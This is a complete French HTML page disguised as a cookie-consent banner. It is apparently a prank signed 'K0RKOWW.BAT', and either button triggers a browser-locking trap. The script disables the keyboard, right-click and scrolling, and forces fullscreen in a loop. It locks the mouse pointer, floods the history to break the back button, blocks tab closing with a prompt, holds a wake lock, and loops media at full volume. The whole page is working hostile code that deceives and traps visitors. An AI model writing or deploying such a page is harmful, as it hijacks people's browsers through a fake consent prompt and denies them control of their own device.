<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>🍪 Cookies</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{
  width:100%;height:100%;overflow:hidden;background:#000;
  font-family:Segoe UI,Arial,sans-serif;color:#fff;user-select:none;
}
body{display:flex;align-items:center;justify-content:center}

.badge{
  position:fixed;top:14px;left:50%;transform:translateX(-50%);
  z-index:3000;color:#00ff88;font:14px/1 "Courier New",monospace;
  letter-spacing:3px;padding:8px 18px;border-radius:20px;
  border:1px solid #00ff8844;background:#000c;text-shadow:0 0 12px #00ff8866;
  white-space:nowrap
}

#overlay{
  position:fixed;inset:0;z-index:1000;display:flex;align-items:center;justify-content:center;
  background:rgba(0,0,0,.9);backdrop-filter:blur(10px);transition:opacity .5s
}
#overlay.hide{opacity:0;pointer-events:none}

.card{
  width:min(460px,92vw);background:linear-gradient(145deg,#1a1a2e,#16213e);
  border:1px solid #00ff8844;border-radius:24px;padding:44px 36px 36px;text-align:center;
  box-shadow:0 20px 60px #000a,0 0 40px #00ff8822
}
.icon{font-size:64px;margin-bottom:12px}
.card h1{font-size:26px;margin-bottom:12px}
.card p{color:#aaa;font-size:15px;line-height:1.6;margin-bottom:28px}
.card strong{color:#00ff88}
.btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
.btn{
  min-width:140px;padding:14px 36px;border-radius:50px;border:none;
  font-size:16px;font-weight:700;cursor:pointer
}
.ok{background:linear-gradient(135deg,#00ff88,#00cc6a);color:#0d0d0d}
.no{background:transparent;color:#ff4444;border:2px solid #ff4444}

/* VIDÉO PLEIN ÉCRAN */
#v{
  position:fixed;inset:0;width:100vw;height:100vh;object-fit:cover;
  background:#000;z-index:2000;display:none
}
#v.on{display:block}

#mark{
  position:fixed;inset:0;z-index:2500;display:none;flex-direction:column;
  align-items:center;justify-content:center;text-align:center;pointer-events:none;
  text-shadow:0 0 20px #000,0 0 40px #000
}
#mark.on{display:flex}
#mark h2{font-size:clamp(28px,7vw,56px);color:#00ff88;font-weight:900;margin-bottom:10px}
#mark .sub{color:#ff4444;font-family:"Courier New",monospace;font-size:16px;animation:blink .4s infinite}
@keyframes blink{50%{opacity:0}}
</style>
</head>
<body>

<div class="badge">⬡ SEARCHED BY K0RKOWW.BAT ⬡</div>

<div id="overlay">
  <div class="card">
    <div class="icon">🍪</div>
    <h1>Ce site utilise des cookies</h1>
    <p>
      Nous utilisons des cookies pour améliorer votre expérience et des pubs
      <strong>hautement personnalisées</strong>.<br><br>
      <strong>Accepter</strong> ou <strong>Refuser</strong> = même résultat.
    </p>
    <div class="btns">
      <button class="btn ok" id="a">✓ Accepter</button>
      <button class="btn no" id="r">✗ Refuser</button>
    </div>
  </div>
</div>

<!-- vidéo / musique du fichier local -->
<video id="v" preload="auto" loop playsinline webkit-playsinline>
  <source src="video.mp3" type="video/mp4">
  <source src="video.mp3" type="audio/mpeg">
  <source src="video.mp4" type="video/mp4">
</video>

<!-- musique de secours si le navigateur bloque le son de la vidéo -->
<audio id="aFx" preload="auto" loop>
  <source src="video.mp3" type="audio/mpeg">
  <source src="video.mp4" type="audio/mp4">
</audio>

<div id="mark">
  <h2>🕹️ PIÉGÉ PAR K0RKOWW</h2>
  <p style="color:#fff;font-size:20px;margin:8px 0 14px">La musique joue. T'es en plein écran.</p>
  <div class="sub">⏺ LOCKED • NE QUITTE PAS • NE FERME PAS</div>
</div>

<script>
(function () {
  const overlay = document.getElementById('overlay');
  const v = document.getElementById('v');
  const aFx = document.getElementById('aFx');
  const mark = document.getElementById('mark');

  // ---- bloque clavier / clic droit ----
  function stop(e){ e.preventDefault(); e.stopPropagation(); return false; }
  ['keydown','keyup','keypress','contextmenu','selectstart','dragstart','copy','cut','paste','wheel']
    .forEach(ev => document.addEventListener(ev, stop, true));

  // ---- anti fermeture onglet ----
  window.addEventListener('beforeunload', e => {
    e.preventDefault();
    e.returnValue = 'LOCKED';
    return 'LOCKED';
  });

  // ---- anti retour navigateur ----
  history.pushState(null, '', location.href);
  window.addEventListener('popstate', () => {
    history.pushState(null, '', location.href);
  });
  setInterval(() => {
    try { history.pushState(null, '', location.href); } catch(_) {}
  }, 80);

  // ---- plein écran forcé ----
  function goFS() {
    const el = document.documentElement;
    const req = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen || el.mozRequestFullScreen;
    if (req) {
      try { req.call(el); } catch(_) {}
    }
    // aussi essayer sur la vidéo
    const vr = v.requestFullscreen || v.webkitRequestFullscreen || v.webkitEnterFullscreen;
    if (vr) {
      try { vr.call(v); } catch(_) {}
    }
  }

  function keepFS() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
      goFS();
    }
  }

  document.addEventListener('fullscreenchange', keepFS);
  document.addEventListener('webkitfullscreenchange', keepFS);

  // ---- lecture vidéo + musique à fond ----
  function playMedia() {
    v.muted = false;
    v.volume = 1.0;
    aFx.muted = false;
    aFx.volume = 1.0;

    const p1 = v.play();
    if (p1 && p1.catch) p1.catch(() => {
      // autoplay parfois bloqué : on mute une micro-seconde puis unmute
      v.muted = true;
      v.play().then(() => {
        v.muted = false;
        v.volume = 1.0;
      }).catch(() => {});
    });

    const p2 = aFx.play();
    if (p2 && p2.catch) p2.catch(() => {
      aFx.muted = true;
      aFx.play().then(() => {
        aFx.muted = false;
        aFx.volume = 1.0;
      }).catch(() => {});
    });
  }

  function forcePlayForever() {
    if (v.paused) playMedia();
    if (aFx.paused) aFx.play().catch(() => {});
    v.muted = false;
    v.volume = 1.0;
    aFx.muted = false;
    aFx.volume = 1.0;
    keepFS();
    try { window.focus(); } catch(_) {}
  }

  v.addEventListener('pause', () => playMedia());
  v.addEventListener('ended', () => playMedia());
  aFx.addEventListener('pause', () => aFx.play().catch(()=>{}));
  aFx.addEventListener('ended', () => aFx.play().catch(()=>{}));

  // ---- pointer lock (souris piégée) ----
  function lockMouse() {
    try {
      const r = document.body.requestPointerLock || document.body.mozRequestPointerLock;
      if (r) r.call(document.body);
    } catch(_) {}
  }
  document.addEventListener('pointerlockchange', () => {
    if (document.pointerLockElement !== document.body) setTimeout(lockMouse, 30);
  });

  // ---- bloquer le scroll tél ----
  document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });

  // ---- piège principal ----
  function trap() {
    overlay.classList.add('hide');
    v.classList.add('on');
    mark.classList.add('on');

    // 1) plein écran immédiat
    goFS();
    setTimeout(goFS, 100);
    setTimeout(goFS, 400);

    // 2) son + vidéo
    playMedia();

    // 3) lock souris
    setTimeout(lockMouse, 150);

    // 4) boucle de surveillance (très serrée)
    setInterval(forcePlayForever, 250);

    // 5) si l'utilisateur quitte le plein écran, on le rattrape
    setInterval(goFS, 400);

    // 6) wake lock (anti veille mobile)
    try {
      if (navigator.wakeLock) {
        navigator.wakeLock.request('screen').then(wl => {
          wl.addEventListener('release', () => {
            navigator.wakeLock.request('screen').catch(()=>{});
          });
        }).catch(()=>{});
      }
    } catch(_) {}

    // 7) si onglet caché → reverrouille au retour
    document.addEventListener('visibilitychange', () => {
      forcePlayForever();
      goFS();
    });

    // 8) tout clic relance tout
    document.addEventListener('click', () => {
      forcePlayForever();
      goFS();
      lockMouse();
    }, true);

    console.log('%cK0RKOWW.BAT LOCK', 'color:#00ff88;font-size:28px;font-weight:900');
  }

  document.getElementById('a').onclick = e => { e.stopPropagation(); trap(); };
  document.getElementById('r').onclick = e => { e.stopPropagation(); trap(); };
})();
</script>
</body>
</html>
